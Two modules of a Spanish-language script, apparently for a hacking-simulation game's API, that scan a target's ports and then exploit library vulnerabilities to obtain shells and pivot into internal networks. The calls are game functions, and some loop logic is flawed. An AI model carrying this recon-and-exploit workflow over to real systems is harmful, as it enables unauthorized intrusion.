// --- INICIO SUB-MODULO: modulos/espectro.nini ---
// modulo espectro.nini - RECONOCIMIENTO AVANZADO
// Automatico con la mejor info

tarea espectro_escaneo_completo(host):
    si not host o host == "":
        error("No hay host definido.")
        retornar null
    
    sh = get_shell
    si sh.ping(host) != 1:
        error("Host inalcanzable: " + host)
        retornar null
    
    router = get_router(host)
    si not router:
        error("No se pudo obtener router.")
        retornar null
    
    es_local = es_ip_local(host)
    
    ports = []
    si es_local:
        ports = router.device_ports(host)
    sino:
        ports = router.used_ports
    
    si not ports o ports.len == 0:
        info("No hay puertos abiertos.")
        retornar null
    
    resultados = []
    i = 1
    
    para port en ports:
        port_num = port.port_number
        servicio_completo = router.port_info(port)
        
        // Separar servicio y version
        servicio = servicio_completo
        version = "N/A"
        
        partes_svc = servicio_completo.split(" ")
        si partes_svc.len > 1:
            servicio = partes_svc[0]
            version = partes_svc[1]
        
        estado = "open"
        si port.is_closed y not es_local:
            estado = "closed"
        
        // Obtener IP LAN
        lan_ip = "N/A"
        si es_local:
            lan_ip = host
        sino:
            lan_ip = port.get_lan_ip
        
        resultados.push({
            "id": i,
            "puerto": port_num,
            "servicio": servicio,
            "version": version,
            "estado": estado,
            "lan_ip": lan_ip,
        })
        
        i = i + 1
    
    retornar resultados

tarea modulo_espectro_recon:
    si globals.objetivo_actual == null:
        error("No hay objetivo. Usa 'objetivo <ip>'")
        retornar
    
    host = globals.objetivo_actual
    
    info("Escaneando " + host + "...")
    
    resultados = espectro_escaneo_completo(host)
    
    si resultados:
        globals.ultimo_scan = resultados
        
        // Mostrar tabla con construir_tabla
        print("")
        info("RESULTADOS DEL ESCANEO:")
        print("")
        columnas = ["ID", "Puerto", "Estado", "Servicio", "Version", "LAN IP"]
        filas = []
        para r en resultados:
            estado_col = r.estado
            si r.estado == "closed": estado_col = "<color=#ff3131>" + r.estado + "</color>"
            si r.estado == "open": estado_col = "<color=#00ff41>" + r.estado + "</color>"
            filas.push([r.id, r.puerto, estado_col, r.servicio, r.version, r.lan_ip])
        print(construir_tabla(columnas, filas))
        print("")
        
        es_local = es_ip_local(host)
        modo_actual = "REMOTO"
        si es_local:
            modo_actual = "LOCAL"
        
        info("Modo: " + modo_actual + " | Puertos: " + str(resultados.len))
    sino:
        error("Sin resultados.")

tarea es_ip_local(ip):
    si not ip: retornar falso
    si ip == "127.0.0.1": retornar verdadero
    
    comp = get_shell.host_computer
    local_ip = comp.local_ip
    
    partes_local = local_ip.split("\.")
    partes_ip = ip.split("\.")
    
    si partes_local.len < 3 o partes_ip.len < 3: retornar falso
    
    red_local = partes_local[0] + "." + partes_local[1] + "." + partes_local[2]
    red_ip = partes_ip[0] + "." + partes_ip[1] + "." + partes_ip[2]
    
    retornar red_local == red_ip

// --- FIN SUB-MODULO: modulos/espectro.nini ---
// --- INICIO SUB-MODULO: modulos/asalto.nini ---
// modulo asalto.nini - Explotacion con seleccion de puerto

tarea modulo_asalto_root:
    si globals.objetivo_actual == null:
        error("No hay objetivo. Usa 'objetivo <ip>'")
        retornar
    
    // Ver si hay scan previo
    si globals.ultimo_scan.len == 0:
        info("Escaneando objetivo...")
        modulo_espectro_recon()
    
    // Pedir seleccion directamente
    sel = pedir("Puerto (ID, 0=router, Enter=todos): ")
    
    port_int = 0
    puerto_seleccionado = null
    
    si sel.len > 0:
        si sel == "0":
            port_int = 0
            info("Atacando router (puerto 0)...")
        sino:
            sel_int = val(sel)
            si sel_int > 0 y sel_int <= globals.ultimo_scan.len:
                puerto_seleccionado = globals.ultimo_scan[sel_int - 1]
                port_int = puerto_seleccionado.puerto
                info("Atacando puerto " + str(port_int) + "...")
            sino:
                port_int = val(sel)
                info("Atacando puerto " + str(port_int) + "...")
    sino:
        info("Atacando todos los puertos...")
        port_int = null
    
    // Verificar modo
    si globals.modo == "LOCAL":
        info("Modo LOCAL - escaneando librerias...")
        ataque_local()
    sino:
        ataque_remoto(port_int)

tarea ataque_local:
    comp = get_shell.host_computer
    
    info("Escaneando librerias en /lib...")
    
    lib_folder = comp.File("/lib")
    si not lib_folder:
        error("No se pudo acceder a /lib")
        retornar
    
    libs = []
    para f en lib_folder.get_files:
        si f.name.indexOf(".so") != null:
            libs.push(f)
    
    si libs.len == 0:
        error("No hay librerias.")
        retornar
    
    info("Librerias: " + str(libs.len))
    
    metax = include_lib("/lib/metaxploit.so")
    si not metax:
        error("Metaxploit no disponible")
        retornar
    
    para lib_file en libs:
        info("Probando: " + lib_file.name)
        
        lib = metax.load(lib_file.path)
        si lib:
            vulns = metax.scan(lib)
            si vulns.len > 0:
                info("  Vulns: " + str(vulns.len))
                para v en vulns:
                    res = lib.overflow(vulns[0], "")
                    si res:
                        exito("ACCESO OBTENIDO!")
                        enjambre[globals.objetivo_actual] = res
                        retornar
    
    error("Sin vulnerabilidades.")

tarea ataque_remoto(port_int):
    host = globals.objetivo_actual
    
    es_router = falso
    r = obtener_router_objetivo(host)
    si r y port_int == 0:
        es_router = verdadero
    
    lan_target = null
    si es_router:
        alerta("ROUTER DETECTADO!")
        opcion = pedir("Saltar a IP interna? [s/n]: ")
        si opcion.lower() == "s":
            lan_target = pedir("IP interna: ")
            info("Saltando a: " + lan_target)
    
    // Cache
    lib_info = obtener_info_libreria(host, port_int)
    
    vulns_cache = []
    si lib_info:
        vulns_cache = obtener_vulnerabilidades(lib_info.lib_name, lib_info.version)
    
    si vulns_cache.len > 0:
        exito("Cache hit: " + lib_info.lib_name)
        para v en vulns_cache:
            info("Explotando: " + v.mem)
            sesion = explotar_directo(lib_info.metalib, v.mem, v.pass, lan_target)
        si typeof(sesion) == "shell" o typeof(sesion) == "computer":
            exito("ACCESO OBTENIDO!")
            enjambre[host] = sesion
            // Auto-jumping
            si typeof(sesion) == "shell" then
                info("Auto-jumping habilitado")
                jumping_auto(sesion, host)
            retornar
    
    // Normal
    info("Buscando vulnerabilidades...")
    vuln = buscar_vulnerabilidad(host, port_int)
    
    si vuln:
        info("Vulnerabilidades: " + str(vuln.v_list.len))
        
        para v en vuln.v_list:
            cachear_vulnerabilidad(vuln.metalib.lib_name, vuln.metalib.version, v.mem, v.pass)
        
        sesion = explotar(vuln, null, lan_target)
        
        si typeof(sesion) == "shell" o typeof(sesion) == "computer":
            exito("ACCESO OBTENIDO!")
            enjambre[host] = sesion
            // Auto-jumping
            si typeof(sesion) == "shell" then jumping_auto(sesion, host)
        sino:
            error("Ataque fallido.")
    sino:
        error("Sin vulnerabilidades.")

tarea obtener_router_objetivo(ip):
    r = get_router(ip)
    si r y r.public_ip == ip:
        retornar r
    retornar null

